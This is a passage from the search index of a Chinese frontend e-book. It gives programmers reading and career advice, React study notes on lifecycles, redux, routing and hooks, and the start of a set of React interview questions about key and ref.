<li>\u6b66\u6797\u9ad8\u624b\u8981\u5b66\u4e60\u5185\u529b\uff08\u5b66\u4e60\u7b97\u6cd5\uff09\uff0c\u800c\u4e0d\u662f\u5341\u516b\u822c\u5175\u5668\uff08\u4e0d\u662f\u5b66\u4e60\u5404\u79cd\u8bed\u8a00\uff0c\u5404\u79cd\u6846\u67b6\uff09</li> <li>\u4efb\u4f55\u4e00\u4e2a\u77e5\u8bc6\u70b9\uff0c\u90fd\u6709\u4e00\u672c\u7ecf\u5178\u7684\u4e66\uff0c\u6b7b\u78d5\u4e0b\u6765\uff0c\u4f60\u5c31\u8d85\u8fc7\u4e86\u5927\u90e8\u5206\u540c\u884c\uff08\u7b97\u6cd5\u7b2c\u56db\u7248\uff0c\u7280\u725b\u4e66\uff0c\u7ea2\u5b9d\u4e66\uff0c\u6bcf\u5e74\u90fd\u770b\u4e00\u904d\uff09\u535a\u5ba2\u9002\u5408\u67e5\u7f3a\u8865\u6f0f\uff0c\u4e0d\u9002\u5408\u6574\u4f53\u5b66\u4e60\uff08\u4e00\u7bc7\u535a\u5ba2\u5b66\u4f1a\u7280\u725b\u4e66\u4e0d\u884c\uff09</li> <li>\u4efb\u4f55\u4e00\u4e2a\u503c\u94b1\u7684\u6280\u80fd\uff0c\u90fd\u4e0d\u53ef\u80fd\u7b80\u5355\u7684\u83b7\u5f97 </li> </ol> <p>\u524d\u7aef\u7684\u8def\u5f88\u5bbd\u5e7f\u7684\uff0c\u662f\u6280\u672f\u5708\u6700\u61c2\u7528\u6237\u4f53\u9a8c\u7684\uff0c\u6700\u6709\u53ef\u80fd\u72ec\u7acb\u505a\u51fa\u9879\u76ee\u7684\u3002\u5e74\u9f84\u9650\u5236\uff0c\u53ea\u9488\u5bf9\u589e\u5220\u6539\u67e5\u7a0b\u5e8f\u5458\u3002\u8d2a\u591a\u56bc\u4e0d\u70c2\u3002</p> <ol> <li>\u65e0\u8bba\u662f\u4f60\u60f3\u8d5a\u94b1\uff0c\u63d0\u5347\u7f16\u7a0b\uff0c\u804c\u4f4d\u664b\u5347\uff0c\u90fd\u9700\u8981\u770b\u4e66</li> <li>\u5c31\u7b97\u4f60\u60f3\u627e\u5bf9\u8c61\uff0c\u6211\u4e5f\u63a8\u8350\u4e00\u672c\u4e66\u300a\u9b54\u2ee4\u7ea6\u4f1a\u5b66\u300b\uff0c\u5982\u4f55\u804a\u5929</li> <li>\u6280\u672f\u5c42\u9762\u7684\u4e66\uff0c\u8c46\u74e38\u5206\u4ee5\u4e0a\uff0c\u90fd\u503c\u5f97\u770b</li> <li>\u6211\u65e9\u4e0a\u770b\u4e66\uff0c\u65e0\u8bba\u51e0\u70b9\u7761\u89c9\uff0c6\u70b9~7\u70b9\u8d77\u5e8a\uff0c\u51fa\u53bb\u8dd1\u6b65\uff0c\u770b\u4e00\u4e2a\u5c0f\u65f6\u4e66</li> <li>\u5f00\u8bfe\u5427\u7684\u88c5\u4fee\uff0c\u5c31\u662f\u56fe\u4e66\u9986\uff0c\u516c\u53f8\u4e5f\u53ef\u4ee5\u770b\u4e66</li> <li>\u8bfb\u4e66\u5176\u5b9e\u662f\u6709\u5feb\u611f\u7684\uff1b\u85aa\u8d44\u7684\u63d0\u5347\u300a\u7b97\u6cd5\u300b\u903c\u683c\u6bd4\u8f83\u9ad8\uff0c\u9002\u5408\u88c5\u903c </li> </ol> <p>\u9879\u76ee\u7684\u601d\u8003\uff0c\u804c\u4e1a\u751f\u6daf\u7684\u601d\u8003</p> <p>\u8bfb\u4e66\uff1aHTTP \u6743\u5a01\u6307\u5357\uff1b\u4f60\u4e0d\u77e5\u9053\u7684 JS\uff08\u4e09\u672c\u4e66\uff09\uff1b\u7b97\u6cd5\uff08\u7b2c\u56db\u7248\uff09\uff1b\u5982\u4f55\u9605\u8bfb\u4e00\u672c\u4e66\uff1b\u7a0b\u5e8f\u5458\u7684\u81ea\u6211\u4fee\u517b\uff1b\u4e0d\u597d\u770b\u7684\u4e66\uff0c\u770b\u4e00\u4e0b\u5c31\u6254\u6389\uff0c\u4e0d\u6d6a\u8d39\u65f6\u95f4</p>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/","title":"\u5f00\u8bfe\u5427 React \u9884\u4e60\u7b14\u8bb0","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 10695  \u9605\u8bfb22\u5206\u949f</p> <ul> <li>01 react-create-app \u529f\u80fd\u3001react/react-dom \u7684\u529f\u80fd\uff0cwebpack \u5165\u53e3\u6587\u4ef6\u914d\u7f6e\u7b49\u7b49</li> <li>02 jsx \u8bed\u6cd5\uff1bCSS\u6a21\u5757\u5316\u7684\u5b9e\u73b0</li> <li>03 \u51fd\u6570\u5316\u7ec4\u4ef6\u548c\u7c7b\u7ec4\u4ef6\uff1b\u51fd\u6570\u5316\u7ec4\u4ef6\u53ef\u4ee5\u901a\u8fc7hook\u5b9e\u73b0\u751f\u547d\u5468\u671f\u51fd\u6570\u548c\u72b6\u6001</li> <li>04 setState \u7684\u53c2\u6570\uff0c\u540c\u6b65\u548c\u5f02\u6b65\u7684\u60c5\u51b5</li> <li>05 \u751f\u547d\u5468\u671f\u51fd\u6570</li> <li>06 \u7ec4\u4ef6\u590d\u5408</li> <li>07 redux</li> <li>08 react-redux</li> <li>09 react-router</li> <li>10 pureComponent \u7eaf\u7ec4\u4ef6\uff0c\u5b9e\u73b0state\u7684\u6d45\u6bd4\u8f83\uff1b</li> <li>11 hook useState useEffect</li> <li>12 \u81ea\u5b9a\u4e49hook\u548c\u6ce8\u610f\u4e8b\u9879\uff08\u4e24\u4e2a\uff09useName \u81ea\u5b9a\u4e49Hook</li> <li>13 useMemo useCallback API \u53ea\u6709\u6ee1\u8db3\u7279\u5b9a\u6761\u4ef6\uff0c\u624d\u6267\u884c\u5185\u90e8\u7684\u51fd\u6570\uff0c\u8fd4\u56de\u7ed3\u679c\uff08\u4e0d\u4f1a\u5728state\u53d8\u5316\u65f6\uff0c\u6267\u884c\u5168\u90e8\u7684\u64cd\u4f5c\uff09</li> </ul>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#5","title":"\u7b2c5\u8bfe \u751f\u547d\u5468\u671f\u51fd\u6570","text":"<p>React 17 \u5e9f\u5f03\u7684\u751f\u547d\u5468\u671f\u51fd\u6570</p> <p>componentWillMount</p> <p>componentWillUpdate</p> <p>componentWillReceiveProps</p> <p>\u65b0\u7684\u751f\u547d\u5468\u671f\u51fd\u6570</p> <p>static getDerivedStateFromProps</p> <p>static getSnapshotBeforeUpdate</p> <p>\u65b0\u51fd\u6570\u548c\u65e7\u51fd\u6570\u4e0d\u80fd\u540c\u65f6\u4f7f\u7528\u3002\u65e7\u51fd\u6570\u53ef\u4ee5\u5148\u52a0\u4e0a UNSAVE \u524d\u7f00:</p> <pre><code>npx react-codemod rename-unsafe-lifecycles &lt;path&gt;\n</code></pre> <p>getDerivedStateFromProps: \u8fd9\u4e2a\u7528\u4e8e\u53d6\u4ee3 componentWillReceiveProps \u53ef\u4ee5\u4ece\u4e0a\u4e00\u4e2a props \u4e2d\u8ba1\u7b97\u51fa\u65b0\u7684state\u5e76\u91cd\u65b0 setState\u3002</p> <p>getSnapshotBeforeUpdate(prevProps, prevState) \u5728 render \u4e4b\u540e\uff0c\u5728 componentDidUpdate \u4e4b\u524d\u3002\u53ef\u4ee5\u5728\u7ec4\u4ef6\u53d1\u751f\u66f4\u6539\u4e4b\u524d\u4ece DOM \u4e2d\u6355\u83b7\u4fe1\u606f\uff08\u6eda\u52a8\u4f4d\u7f6e\u7b49\uff09\u3002</p> <p>\u8fd4\u56de\u503c\u5c31\u4f20\u9012\u7ed9 componentDidUpdate\uff08prevProps, prevState, snapshot\uff09\u51fd\u6570\u4e2d</p>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#6","title":"\u7b2c6\u8bfe \u7ec4\u4ef6\u590d\u5408","text":"<p>\u7ec4\u4ef6\u590d\u5408\uff08\u7ec4\u4ef6\u5d4c\u5957\u4f7f\u7528\uff0c\u9ad8\u9636\u7ec4\u4ef6\uff09\u7236\u7ec4\u4ef6\u7ed9\u5b50\u7ec4\u4ef6 children \u4e2d\uff0c\u53ef\u4ee5\u662f\u76f4\u63a5\u7684JSX\u6216\u8005\u5b57\u7b26\u4e32\uff0c\u4e5f\u53ef\u4ee5\u4f20\u4e00\u4e2a\u5bf9\u8c61\uff08\u5c5e\u6027\u5305\u62ec\u5b57\u7b26\u4e32\uff0cJSX\uff0c\u51fd\u6570\uff09\u5b50\u7ec4\u4ef6\u4e2d\u4f7f\u7528 children.obj \u83b7\u53d6\u5bf9\u5e94\u7684\u5c5e\u6027\u5373\u53ef</p>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#7-redux","title":"\u7b2c7\u8bfe redux","text":"<p>\u9996\u5148 let store = createStore(reducer); \u521b\u5efa\u4e00\u4e2a store\u3002</p> <p>\u5176\u4e2d reducer \u662f\u66f4\u65b0 store \u7684\u51fd\u6570\u3002reducer(state, action) \u6839\u636e action \u5bf9\u8c61\u7684\u66f4\u65b0 state\u3002\u5728\u5177\u4f53\u7684\u7ec4\u4ef6\u4e2d\u5f15\u5165 store\u3002</p> <p>\u901a\u8fc7 store.getState \u83b7\u53d6\u72b6\u6001\u3002\u901a\u8fc7 store.dispatch({type: 'ADD'}) \u89e6\u53d1 action\uff0c\u6539\u53d8 store \u4e2d\u7684\u72b6\u6001\uff08state\uff09\u3002</p> <p>\u53ef\u4ee5\u5728\u7ec4\u4ef6\u4e2d\u8ba2\u9605 state \u7684\u53d8\u5316\u7684\u56de\u8c03\u51fd\u6570\uff08didmount \u9636\u6bb5\uff09\u3002</p> <p>store.dispatch(() =&gt; {\u56de\u8c03\u51fd\u6570\u4e2d\uff0cthis.forceUpdate()  \u7ec4\u4ef6\u5f3a\u5236\u66f4\u65b0\u3002}) \u8fd9\u6837\u4e00\u4e2a\u5468\u671f\u5b9e\u73b0\u3002\u4e0d\u540c\u7ec4\u4ef6\u53ef\u4ee5\u8ba2\u9605\u4e0d\u540c\u7684\u72b6\u6001\u548c\u89e6\u53d1\u4e0d\u540c\u7684\u56de\u8c03\u51fd\u6570\u3002</p> <pre><code>// redux\uff0c\u72b6\u6001\u7ba1\u7406\u5de5\u5177\n// \u9002\u5e94\u4e8e\u5927\u91cf\u53d8\u5316\u7684\u6570\u636e+\u72b6\u6001\u9700\u8981\u5171\u4eab\uff08\u7528\u4e8e\u5904\u7406\u7531\u4e8e\u72b6\u6001\u63d0\u5347\uff0c\u9020\u6210\u9876\u7ea7\u7ec4\u4ef6\u4e2d state \u975e\u5e38\u591a\u96be\u4ee5\u7ef4\u62a4\u7684\u60c5\u51b5\uff09\n// \u6d41\u7a0b\uff1areducer(current state) -&gt; redux(store) -&gt; view -&gt; dispatch -&gt; action(change state) -&gt; reducer\n// npm install redux --save\n// \u5982\u679c\u662f\u67d0\u4e2a\u7ec4\u4ef6\u5185\u90e8\u7684\u72b6\u6001\uff0c\u90a3\u4e48\u4e0d\u9700\u8981\u4f7f\u7528 redux \u8fdb\u884c\u72b6\u6001\u7ba1\u7406\n\n// demo \u7d2f\u52a0\u5668\n\n// store ReduxStore.js\nimport { createStore } from 'redux';\n\nconst counterReducer = (state = 0, action) =&gt; {\n  switch (action.type) {\n    case \"ADD\":\n      return state + 1\n    case 'MINUS':\n      return state - 1\n    default:\n      return state\n  }\n}\n\nconst store = createStore(counterReducer);\n\nexport default store;\n</code></pre> <p>reduxPage <pre><code>import React from 'react';\nimport store from '../store/ReduxStore';\n\nclass ReduxPage extends React.Component {\n\n  componentDidMount() {\n    store.subscribe(() =&gt; {\n      this.forceUpdate();\n    });\n  }\n\n  add = () =&gt; {\n    store.dispatch({ type: \"ADD\" });\n  }\n\n  minus = () =&gt; {\n    store.dispatch({ type: 'MINUS' });\n  }\n\n  render() {\n    console.log(store);\n    return (\n      &lt;p&gt;{store.getState()}&lt;/p&gt;\n    );\n  }\n}\n\nexport default ReduxPage;\n</code></pre></p> <p>\u6216\u8005\u5728\u9876\u7ea7\u7ec4\u4ef6\u4e2d\u76d1\u542c\u4e8b\u4ef6\u5e76\u66f4\u65b0\u5168\u90e8\u7684\u5185\u5bb9</p> <p>\u5728 index \u4e2d\u8ba2\u9605\u72b6\u6001\u53d8\u66f4</p> <pre><code>import store from './store/reduxStore';\n\nconst render = () =&gt; {\n  ReactDOM.render(\n    &lt;App/&gt;,\n    document.getElementById('#root')\n  );\n}\nrender();\nstore.subscribe(render);\n</code></pre> <p>\u64cd\u4f5c\u8981\u70b9</p> <ul> <li>createStore \u521b\u5efa store</li> <li>reducer \u521d\u59cb\u5316 state</li> <li>getState \u83b7\u53d6 state</li> <li>dispatch \u63d0\u4ea4\u66f4\u65b0</li> <li>subscribe \u53d8\u66f4\u8ba2\u9605</li> </ul>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#8-react-redux","title":"\u7b2c8\u8bfe react-redux","text":"<p>Provider \u5305\u88f9APP\u9876\u5c42\u7ec4\u4ef6\uff0c\u4f7f\u5f97\u5168\u5c40\u53ef\u4ee5\u76f4\u63a5\u4f7f\u7528Store <code>&lt;Provider store={store}&gt;&lt;App/&gt;&lt;/Provider&gt;</code> connect \u5728\u5b50\u7ec4\u4ef6\u4e2d\u83b7\u53d6 store\u3002</p> <p><code>connect(connectStatetoProps, connectDispatchToProps)(Component);</code> \u5176\u4e2d\u7b2c\u4e8c\u4e2a\u62ec\u53f7\u4e2d\u662f\u7ec4\u4ef6\u3002</p> <p>\u7b2c\u4e00\u4e2a\u62ec\u53f7\u4e2d\u4f20\u9012\u4e24\u4e2a\u53c2\u6570\uff08state2Props, dispatch2props\uff0c\u5206\u522b\u8868\u793a\u628astate \u548c dispatch \u6620\u5c04\u5230 prop \u4e2d\uff09</p> <p>\u8fd9\u6837\uff0c\u5728\u5b50\u7ec4\u4ef6\u4e2d\uff0c\u4e0d\u9700\u8981\u76f4\u63a5\u4f7f\u7528 store.getState \u548c store.dispatch \u4f20\u503c\uff0c\u76f4\u63a5\u4f7f\u7528 <code>{ state, dispatch } = this.props</code> \u83b7\u53d6\u5373\u53ef\u3002</p> <p>dispatch \u53ef\u4ee5\u66f4\u6539\u6210\u4e00\u4e2a\u5bf9\u8c61\uff0c\u5b58\u50a8\u591a\u4e2a\u5bf9\u5e94\u7684\u51fd\u6570\u3002redux \u9002\u5408\u5176\u4ed6\u5e93\uff0creact-redux \u4e13\u95e8\u7528\u4e8ereact \u4e2d\u4f7f\u7528\u72b6\u6001\u3002connect \u662f\u4e00\u4e2a\u9ad8\u9636\u7ec4\u4ef6\u3002</p> <pre><code>// npm install react-redux --save\n// provider \u63d0\u4f9b store\n// connect \u63d0\u4f9b\u6570\u636e\u53d8\u66f4\u64cd\u4f5c\n\nimport React from 'react';\nimport ReactDom from 'react-dom';\nimport App from './App';\nimport store from './store';\nimport { Provider } from 'react-redux';\n\nReactDom.render(\n  &lt;Provider store={store}&gt;\n    &lt;App/&gt;\n  &lt;/Provider&gt;,\n  document.getElementById('#root')\n);\n\n// \u83b7\u53d6\u72b6\u6001\u6570\u636e\nimport React from 'react';\nimport { connect } from 'react-redux';\n\nclass ReactReduxPage extends React.Component {\n  render() {\n    const { num, add, minus } = this.props;\n    return (\n      &lt;div&gt;&lt;/div&gt;\n    );\n  }\n}\n\nconst mapStateToProps = state =&gt; {\n  return {\n    num: state,\n  };\n};\n\nconst mapDispatchToProps = {\n  add: () =&gt; {\n    return { type: 'add' };\n  },\n  minus: () =&gt; {\n    return { type: 'minus' };\n  }\n};\n\n// \u9ad8\u9636\u7ec4\u4ef6\nexport default connect(\n  mapStateToProps,\n  mapDispatchToProps,\n)(ReactReduxPage);\n\n// \u53c2\u65701\uff1astate\u6620\u5c04\n// \u53c2\u65702\uff1a\u4e8b\u4ef6\u6620\u5c04\n</code></pre>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#9","title":"\u7b2c9\u8bfe","text":"<p>Router \u7ec4\u4ef6\u8fdb\u884c\u5305\u88f9\uff0cLink \u8868\u793a\u8df3\u8f6c\u7684\u94fe\u63a5\uff0cRoute \u662f\u6839\u636e\u4e0d\u540cURL\u8fdb\u884c\u8df3\u8f6c\uff08\u53ef\u4ee5\u7cbe\u786e\u5339\u914d\uff0c\u53ef\u4ee5\u8fdb\u884c\u4f20\u53c2\uff09\uff0c\u53c2\u6570\u4e2d children &gt; component &gt; render \u3002</p> <p>\u53ef\u4ee5\u4f7f\u7528 switch \u5305\u88f9\u4e00\u7ec4 Router \u5b9e\u73b0\u9009\u62e9\u5176\u4e2d\u4e00\u4e2a\u8fdb\u884c\u6e32\u67d3\uff0c\u4e3b\u8981\u7528\u4e8e404\u9519\u8bef\u754c\u9762\u7684\u5904\u7406\u3002</p> <pre><code>// npm install react-router-dom --save\n\nimport React from 'react';\nimport { BrowserRouter as Router, Link, Route } from 'react-router-dom';\n\nexport default class Text extends React.Component {\n  render() {\n    return (\n      &lt;Router&gt;\n        &lt;Link to=\"/\"&gt;\u9996\u9875&lt;/Link&gt;\n        &lt;Link to=\"/user\"&gt;\u7528\u6237&lt;/Link&gt;\n        &lt;Route\n          exact\n          path='/'\n          // children={() =&gt; &lt;span&gt;&lt;/span&gt;}\n          component={HomePage}\n          // render={() =&gt; &lt;hr/&gt;}\n        /&gt;\n        &lt;Route\n          path=\"/user\"\n          component={UserPage}\n        /&gt;\n      &lt;/Router&gt;\n    );\n  }\n}\n</code></pre> <p>\u5b50\u7ec4\u4ef6\u662f\u552f\u4e00\u7684\uff1achildren &gt; component &gt; render exact \u8868\u793a\u7cbe\u786e\u5339\u914d <code>&lt;Switch&gt;&lt;/Stitch&gt;</code> \u8868\u793a\u9009\u62e9\uff0c\u53ea\u80fd\u9009\u62e9\u4e00\u4e2a\u60c5\u51b5\uff0c\u8fd9\u6837\u53ef\u4ee5\u5904\u7406404\u7684\u60c5\u51b5\uff08\u524d\u8fb9\u51e0\u4e2a\u90fd\u4e0d\u6ee1\u8db3\uff0c\u6700\u540e\u4e00\u4e2aRoute path \u4e0d\u4f20\u53c2\uff0c\u663e\u793a\u7a7a\u9875\u9762\u7684\u63d0\u9192\uff09 Link \u5b9e\u8d28\u662f\u5c71A\u6807\u7b7e\uff1broute\u4f1a\u6839\u636eURL\u7684\u4e0d\u540c\uff0c\u8df3\u8f6c\u5230\u4e0d\u540c\u7684\u5b50\u9875\u9762\uff08\u7ec4\u4ef6\uff09\u4e2d \u5f53\u7136\uff0c\u8fd9\u90e8\u5206python-urls\uff08Django\uff09\u6a21\u677f\u5df2\u7ecf\u5b9e\u73b0\u4e86\u4f20\u53c2</p>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#10-purecomponent","title":"\u7b2c10\u8bfe pureComponent","text":"<p>pureComponent \u5b9e\u73b0\u4e86 shouldComponentUpdate</p> <p>\u5b9e\u73b0\u4e86\u6570\u636e\u7684\u6d45\u5bf9\u6bd4\uff0c\u9002\u5408\u4e8eUI\u5c55\u793a\u754c\u9762</p> <p>\u6700\u7ec8\u51cf\u5c11\u754c\u9762render\u4f18\u5316\u6027\u80fd</p> <pre><code>import React from 'react';\n\nexport default class Demo extends React.PureComponent {\n  constructor(props) {\n    super(props);\n    this.state = {\n      counter: 0,\n      data: {\n        num: 0\n      }\n    };\n  }\n  // setState({ counter++ })\n  // setState({ data.num++ })\n}\n\n// \u5185\u90e8\u903b\u8f91\u5b9e\u73b0\nfunction shallowEqual(objA: mixed, objB: mixed): boolean {\n  if (Object.is(objA, objB)) {\n    return true;\n  }\n  if (\n    typeof objA !== 'object' ||\n    objA === null ||\n    typeof objB !== 'object' ||\n    objB === null\n  ) {\n   return false;\n  }\n  const keysA = Object.keys(objA);\n  const keysB = Object.keys(objB);\n  if (keysA.length !== keysB.length) {\n    return false;\n  }\n  for (let i = 0; i &lt; keysA.length; i++) {\n    if (\n      !hasOwnProperty.call(objb, keysA[i]) ||\n      !Object.is(objA[keysA[i]], objB[keysA[i]])\n    ) {\n      return false;\n    }\n  }\n  return true;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#11","title":"\u7b2c11\u8bfe","text":"<pre><code>import React, { useState } from 'react';\n\nexport default function HookPage(props) {\n  const [count, setCount] = useState(0);\n  return (\n    &lt;button onClick={() =&gt; setCount(count + 1)}&gt;&lt;/button&gt;\n  );\n}\n\n// \u66f4\u65b0\u540e\u7684\u7ec4\u4ef6\uff08\u53ef\u4ee5\u5927\u5927\u7b80\u5316\u4ee3\u7801\uff09\n// \u53ef\u4ee5\u5c1d\u8bd5\u628a\u4e00\u4e2a\u7c7b\u7ec4\u4ef6\u4f18\u5316\u6210\u4e00\u4e2aHook\u7ec4\u4ef6\nexport default function Page2(props) {\n  const [count, setCount] = useState(0);\n  const [date, setDate] = useState(new Date());\n  useEffect(() =&gt; {\n    document.title = `test ${count}`;\n  }, [count]);\n  useEffect(() =&gt; {\n    const timer = setInterval(() =&gt; {\n      setDate(new Date());\n    }, 1000);\n    return () =&gt; clearInterval(timer);\n  }, []);\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#12-hook","title":"\u7b2c12\u8bfe \u81ea\u5b9a\u4e49 hook","text":"<p>\u51fd\u6570\u7ec4\u4ef6\u4e2d\u4f7f\u7528 Hook \u5b9e\u73b0\u72b6\u6001\u548c\u751f\u547d\u5468\u671f\u51fd\u6570</p> <pre><code>import React\uff0c{ useState, useEffect } from 'react';\n\nexport function Test(props) {\n  const [data, setDate] = useState(new Date());\n  useEffect(() =&gt; {\n    const timer = setInterval(() =&gt; {\n      setDate(new Date());\n    }, 1000);\n    // return \u8fd9\u91cc\u8868\u793a componentWillUnmount \u9636\u6bb5\n    return () =&gt; clearInterval(timer);\n  }, []);\n  // \u8fd9\u91cc\u7b2c\u4e8c\u4e2a\u53c2\u6570\u8868\u793a componentDidMount \u66f4\u65b0\u89e6\u53d1\u7684\u6761\u4ef6\n  // \u5982\u679c\u4e0d\u52a0\u7684\u8bdd\uff0c\u6bcf\u6b21\u7ec4\u4ef6\u66f4\u65b0\u90fd\u4f1a\u89e6\u53d1\u5185\u90e8\u4ee3\u7801\u6267\u884c\n  // \u73b0\u5728\u662f\u7a7a\u6570\u7ec4\uff0c\u90a3\u4e48\u5728 componentDidMount \u9636\u6bb5\u90fd\u4f1a\u6267\u884c\n  return (\n    &lt;div&gt;{date.toLocalTimeString()}&lt;/div&gt;\n  );\n}\n</code></pre> <p>useEffect \u51fd\u6570\u76f8\u5f53\u4e8e\uff1acomponentDidMount componentDidMount componentWillUnmount \u751f\u547d\u5468\u671f\u51fd\u6570\u3002</p> <p>hook \u6ce8\u610f\u4e8b\u9879\uff1a</p> <ul> <li>\u53ea\u80fd\u5728\u51fd\u6570\u5916\u5c42\u8c03\u7528\uff0c\u4e0d\u80fd\u518d\u6761\u4ef6\u3001\u5faa\u73af\u3001\u5b50\u51fd\u6570\u4e2d\u4f7f\u7528</li> <li>\u53ea\u80fd\u5728 react \u51fd\u6570\u7ec4\u4ef6\u3001\u6216\u8005\u81ea\u5b9a\u4e49 Hook \u4e2d\u4f7f\u7528\u3002\u4e0d\u80fd\u76f4\u63a5\u5728 \u539f\u751fJS\u4e2d\u4f7f\u7528 Hook\u3002</li> </ul> <p>\u81ea\u5b9a\u4e49Hook\uff1a</p> <pre><code>function useClock() {\n  const [ data, setData ] = useState(new Date());\n  useEffect(() =&gt; {\n    const timer = setInterval(() =&gt; {\n        let date = new Date();\n      setData(date);\n    }, 1000);\n    return () =&gt; clearInterval(timer);\n  }, []);\n  return data;\n}\n</code></pre>"},{"location":"ebook-kaikeba-frontend/08-React%E9%A2%84%E4%B9%A0%E7%AC%94%E8%AE%B0/#13-usememo-usecallback","title":"\u7b2c13\u8bfe useMemo useCallback","text":"<p>useMemo</p> <pre><code>const date = useMemo(() =&gt; {\n  return new Date();\n  // \u53ea\u6709time\u6539\u53d8\u540e\uff0c\u8fd9\u91cc\u624d\u91cd\u65b0\u6267\u884c\n  // \u5176\u4ed6state\u53d8\u5316\uff0c\u8fd9\u91cc\u4e0d\u4f1a\u91cd\u65b0\u6267\u884c\n}, [time]);\n\n// date \u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9\u5b50\u7ec4\u4ef6\n</code></pre> <p>useCallback</p> <pre><code>const fn = useCallback(() =&gt; {\n  return new Date();\n}, [time]);\n\n&lt;Child fn={fn}/&gt;\n</code></pre> <p>\u8fd9\u4e24\u4e2aAPI\u53c2\u6570\u76f8\u540c\uff1a\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u56de\u8c03\u51fd\u6570\uff0c\u7b2c\u4e8c\u4e2a\u662f\u5224\u65ad\u6761\u4ef6\u3002</p> <p>\u8fd9\u4e24\u4e2aAPI\u53ef\u4ee5\u8f6c\u6362\uff1auseCallback(fn, deps)  === useMemo(() =&gt; fn, deps);</p>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/","title":"\u5f00\u8bfe\u5427 React \u9762\u8bd5\u9898","text":"<p>\u7edf\u8ba1\u4fe1\u606f\uff1a\u5b57\u6570 9916  \u9605\u8bfb20\u5206\u949f</p>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#1key","title":"1\u3001key \u662f\u4ec0\u4e48\uff1f\u6709\u4ec0\u4e48\u4f5c\u7528\uff1f","text":"<p>key \u7528\u4e8e\u6807\u8bb0\u540c\u7ea7\u5143\u7d20\u7684\u552f\u4e00\u6807\u793a\u3002\u4f5c\u7528\u662f\u6807\u8bc6\u552f\u4e00\u6027\uff08\u6e32\u67d3\u7684\u65f6\u5019\u662f\u5426\u91cd\u590d\u6e32\u67d3\u8282\u70b9\uff0c\u5982\u679c\u662f\u540c\u4e00\u4e2a\u5143\u7d20\uff0c\u76f4\u63a5\u590d\u7528\u8fd9\u4e2a\u5143\u7d20\uff09\uff1bFiber\u539f\u6765\u662f\u4e00\u4e2a\u94fe\u8868\u7ed3\u6784\uff0c\u901a\u8fc7 key \u7684\u552f\u4e00\u6027\u7279\u6027\u8f6c\u6362\u6210\u4e00\u4e2a Map\u5bf9\u8c61\uff0c\u65b9\u4fbf\u8bfb\u53d6Fiber\u8282\u70b9\uff08React\u6e90\u7801\uff09\u3002</p>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#2ref","title":"2\u3001ref \u662f\u4ec0\u4e48\uff1f\u521b\u5efa\u7684\u4e09\u79cd\u65b9\u5f0f\uff1f\u600e\u6837\u4f7f\u7528\uff1f","text":"<p>Ref\u76ee\u7684\u662f\u83b7\u53d6\u539f\u751f\u7684DOM\u8282\u70b9\uff0c\u8fdb\u4e00\u6b65\u83b7\u53d6\u5143\u7d20\u7684\u5c3a\u5bf8\uff0c\u6216\u8005\u8868\u5355\u7684\u503c\u3002</p> <p>\u5177\u4f53\u53ef\u4ee5\u7ed9\u67d0\u4e2aHTML\u5143\u7d20\u8bbe\u7f6eREF\uff0c\u76f4\u63a5\u83b7\u53d6DOM\u8282\u70b9\u3002\u6216\u8005\u7ed9\u67d0\u4e2a\u7c7b\u7ec4\u4ef6\u8bbe\u7f6eREF\uff0c\u76f4\u63a5\u83b7\u53d6\u7ec4\u4ef6\u5bf9\u8c61\uff08\u7136\u540e\u83b7\u53d6\u5185\u90e8\u7684\u5c5e\u6027\u548c\u65b9\u6cd5\uff09\u3002</p>"},{"location":"ebook-kaikeba-frontend/09-React%E9%9D%A2%E8%AF%95%E9%A2%98/#ref","title":"\u521b\u5efaREF","text":"<p>\u63a8\u8350 <code>this.refs = React.createRef()</code> \u521b\u5efa REF\uff0c\u7136\u540e\u901a\u8fc7 current \u83b7\u53d6DOM\u8282\u70b9\u3002</p> <p>\u76f4\u63a5\u4f7f\u7528\uff08\u4f8b\u5b50\uff09input</p> <pre><code>this.nameInputRef = React.createRef();\nlet value = this.nameInputRef.current.value;\n\n// &lt;input type=\"text\" ref={this.nameInputRef}/&gt;\n</code></pre> <p>\u56de\u8c03\u51fd\u6570\u83b7\u53d6REF</p> <pre><code>setRef = node =&gt; {\n  this.ref = node;\n}\n// &lt;input type=\"text\" ref={this.setRef}&gt;\n</code></pre> <p>\u5185\u8054\u51fd\u6570\u5728\u6bcf\u6b21render\u90fd\u4f1a\u521b\u5efa\u4e00\u4e2a\u533f\u540d\u51fd\u6570\uff0c\u91cd\u65b0\u8bbe\u7f6eREF\uff0c\u5c3d\u91cf\u51cf\u5c11\u4f7f\u7528\u3002</p> <pre><code>// &lt;input type=\"text\" ref={node =&gt; {this.ref = node;}&gt;\n</code></pre> <p>\u4e0d\u63a8\u8350\u4f7f\u7528\u5b57\u7b26\u4e32 this.refs.textInput \u521b\u5efa REF\uff0c\u5927\u91cf\u4f7f\u7528\u6709\u6027\u80fd\u95ee\u9898\u3002</p> 